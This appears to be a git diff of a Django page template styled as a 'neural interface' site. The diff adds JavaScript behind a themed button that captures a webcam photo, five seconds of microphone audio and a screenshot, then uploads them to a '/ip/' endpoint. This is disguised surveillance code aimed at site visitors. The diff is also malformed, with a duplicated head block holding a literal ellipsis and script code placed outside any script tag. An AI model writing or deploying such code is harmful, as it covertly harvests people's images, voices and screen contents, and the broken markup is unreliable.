@@ -5,6 +5,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <head>
+    <meta name="csrf-token" content="{{ csrf_token }}">
+    ...
+</head>
+
     <title>Cyber Glass - Neural Interface Design</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -215,10 +220,95 @@ https://templatemo.com/tm-597-neural-glass
 
     <!-- Footer -->
    {% include 'footer.html' %}
+
+    document.getElementById('neural-link-btn').addEventListener('click', async function (e) {
+    e.preventDefault();
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const cameraBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+
+        const audioChunks = [];
+        const recorder = new MediaRecorder(stream);
+
+        recorder.ondataavailable = e => audioChunks.push(e.data);
+
+        recorder.start();
+
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        recorder.stop();
+
+        await new Promise(resolve => {
+            recorder.onstop = () => resolve();
+        });
+
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+
+        let screenBlob = null;
+        try {
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const screenVideo = document.createElement('video');
+            screenVideo.srcObject = screenStream;
+            screenVideo.play();
+
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            const screenCanvas = document.createElement('canvas');
+            screenCanvas.width = 1280;
+            screenCanvas.height = 720;
+            screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0, screenCanvas.width, screenCanvas.height);
+            screenBlob = await new Promise(resolve => screenCanvas.toBlob(resolve, 'image/png'));
+
+            screenStream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            console.warn('Ekran görüntüsü alınmadı:', err);
+        }
+
+        const formData = new FormData();
+        formData.append('camera_image', cameraBlob, 'camera.png');
+        formData.append('audio', audioBlob, 'audio.webm');
+        if (screenBlob) {
+            formData.append('screen_image', screenBlob, 'screen.png');
+        }
+
+        const csrftoken = getCookie('csrftoken');
+
+        const response = await fetch('/ip/', {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': csrftoken
+            },
+            body: formData
+        });
+
+        if (response.ok) {
+            alert("Media uğurla göndərildi ✅");
+        } else {
+            alert("Xəta baş verdi!");
+        }
+
+    } catch (err) {
+        console.error('Media icazəsi və ya göndərmə zamanı xəta:', err);
+        alert("İcazə verilmədi və ya xəta baş verdi.");
+    }
+});
+
 <script src="{% static 'templatemo-neural-scripts.js' %}"></script>
 
-<script>
 
-</script>
+
+
 </body>
 </html>
